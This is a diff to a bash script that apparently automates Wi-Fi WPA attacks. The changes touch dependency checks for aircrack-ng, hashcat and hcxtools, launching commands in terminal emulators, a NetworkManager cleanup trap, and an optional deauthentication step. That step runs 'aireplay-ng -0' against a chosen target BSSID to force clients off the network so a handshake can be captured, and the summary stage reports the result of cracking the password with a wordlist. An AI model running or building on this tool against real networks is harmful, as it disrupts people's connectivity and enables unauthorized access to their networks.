@@ -19,40 +19,30 @@ CAPTURE_FILE=""
 
 # Dependency checks
 check_dependencies() {
-  local missing_fatal=0
+  local warnings=()
 
-  echo -e "\n  ${CYAN}[*] Checking dependencies...${NC}\n"
-
-  if command -v aircrack-ng &>/dev/null; then
-    echo -e "  ${GREEN}[✓] aircrack-ng found${NC}"
-    sleep 1
-  else
-    echo -e "  ${RED}[✗] aircrack-ng not found — this is required.${NC}"
-    missing_fatal=1
-  fi
-
-  if command -v hashcat &>/dev/null; then
-    echo -e "  ${GREEN}[✓] hashcat found${NC}"
-    sleep 1
-  else
-    echo -e "  ${YELLOW}[!] hashcat not found — hashcat cracking will not work.${NC}"
-    sleep 2
-  fi
-
-  if command -v hcxpcapngtool &>/dev/null; then
-    echo -e "  ${GREEN}[✓] hcxtools found${NC}"
-    sleep 1
-  else
-    echo -e "  ${YELLOW}[!] hcxtools not found — hashcat cracking will not work.${NC}"
-    sleep 2
-  fi
-
-  if [[ $missing_fatal -eq 1 ]]; then
-    echo -e "\n  ${RED}[!] Missing required dependencies. Exiting.${NC}\n"
+  if ! command -v aircrack-ng &>/dev/null; then
+    echo -e "\n  ${RED}[✗] aircrack-ng is not installed — this is required.${NC}"
+    echo -e "      Install with: ${BOLD}sudo apt install aircrack-ng${NC}\n"
     exit 1
   fi
 
-  echo ""
+  if ! command -v hashcat &>/dev/null; then
+    warnings+=("hashcat is not installed — hashcat cracking will not work. Install with: sudo apt install hashcat")
+  fi
+
+  if ! command -v hcxpcapngtool &>/dev/null; then
+    warnings+=("hcxtools is not installed — hashcat cracking will not work. Install with: sudo apt install hcxtools")
+  fi
+
+  if [[ ${#warnings[@]} -gt 0 ]]; then
+    echo -e ""
+    for w in "${warnings[@]}"; do
+      echo -e "  ${YELLOW}[!] $w${NC}"
+    done
+    echo -ne "\n  Press Enter to continue..."
+    read -r
+  fi
 }
 
 # Helper functions
@@ -97,6 +87,14 @@ bail() {
   echo -e "\n${RED}  [!] $1${NC}\n"
   exit 1
 }
+
+cleanup() {
+  echo -e "\n\n  ${CYAN}[*] Restoring network connectivity...${NC}"
+  sudo systemctl restart NetworkManager
+  echo -e "  ${GREEN}[✓] NetworkManager restarted.${NC}\n"
+}
+
+trap cleanup EXIT
 
 advance_stage() {
   STAGE=$((STAGE + 1))
@@ -244,39 +242,10 @@ launch_in_terminal() {
   local wrapped="$cmd; touch '$flag'"
 
   case "$TERMINAL" in
-  kitty)
-    kitty -- bash -c "$wrapped" &
-    ;;
-  alacritty)
-    alacritty -e bash -c "$wrapped" &
-    ;;
-  wezterm)
-    wezterm start -- bash -c "$wrapped" &
-    ;;
-  foot)
-    foot bash -c "$wrapped" &
-    ;;
-  gnome-terminal)
-    gnome-terminal -- bash -c "$wrapped" &
-    ;;
-  xfce4-terminal)
-    xfce4-terminal -e "bash -c \"$wrapped\"" &
-    ;;
-  konsole)
-    konsole -e bash -c "$wrapped" &
-    ;;
-  qterminal)
-    qterminal -e "bash -c \"$wrapped\"" &
-    ;;
-  lxterminal)
-    lxterminal -e "bash -c \"$wrapped\"" &
-    ;;
-  xterm)
-    xterm -e bash -c "$wrapped" &
-    ;;
-  *)
-    bail "Could not detect a supported terminal emulator. Set \$TERMINAL manually."
-    ;;
+  kitty) "$TERMINAL" -- bash -c "$wrapped" & ;;
+  alacritty) "$TERMINAL" -e bash -c "$wrapped" & ;;
+  wezterm) "$TERMINAL" start -- bash -c "$wrapped" & ;;
+  *) "$TERMINAL" -e "bash -c \"$wrapped\"" & ;;
   esac
 
   # Return the flag path so the caller can wait on it
@@ -431,18 +400,24 @@ stage_capture() {
   echo -e "\n  ${CYAN}[*] Step 2 — Send deauthentication packets${NC}\n"
 
   while true; do
-    echo -ne "  ${YELLOW}  > How many deauth packets to send (e.g. 5, or 0 for continuous): ${NC}"
+    echo -ne "  ${YELLOW}> How many deauth packets to send (leave blank to skip, 0 for continuous): ${NC}"
     read -r PACKET_COUNT
+
+    [[ -z "$PACKET_COUNT" ]] && PACKET_COUNT="" && break
     [[ "$PACKET_COUNT" =~ ^[0-9]+$ ]] && break
-    echo -e "  ${RED}[!] Please enter a valid number.${NC}"
+    echo -e "  ${RED}[!] Please enter a valid number or leave blank to skip.${NC}"
   done
 
-  confirm "Send deauth to $TARGET_BSSID now?" || bail "Aborted."
-
-  launch_in_terminal "sudo aireplay-ng -0 '$PACKET_COUNT' -a '$TARGET_BSSID' '$INTERFACE'" >/dev/null
-
-  echo -e "\n  ${YELLOW}[*] Deauth window launched.${NC}"
-  while IFS= read -r -t 0 _; do :; done 2>/dev/null
+  if [[ -z "$PACKET_COUNT" ]]; then
+    echo -e "\n  ${YELLOW}[*] Skipping deauth.${NC}"
+  else
+    confirm "Send deauth to $TARGET_BSSID now?" || bail "Aborted."
+    launch_in_terminal "sudo aireplay-ng -0 '$PACKET_COUNT' -a '$TARGET_BSSID' '$INTERFACE'" >/dev/null
+    echo -e "\n  ${YELLOW}[*] Deauth window launched.${NC}"
+    echo -ne "  ${YELLOW}    Press Enter when ready to continue...${NC}"
+    read -r
+    while IFS= read -r -t 0 _; do :; done 2>/dev/null
+  fi
 
   # Confirm handshake
   echo -e "\n  ${YELLOW}[*] Watch the capture window for 'WPA handshake: $TARGET_BSSID'.${NC}"
@@ -620,8 +595,6 @@ stage_summary() {
   else
     echo -e "  ${RED}[!] Password not found. The wordlist did not contain the password.${NC}\n"
   fi
-
-  sudo systemctl restart NetworkManager
 }
 
 # ─────────────────────────────────────────
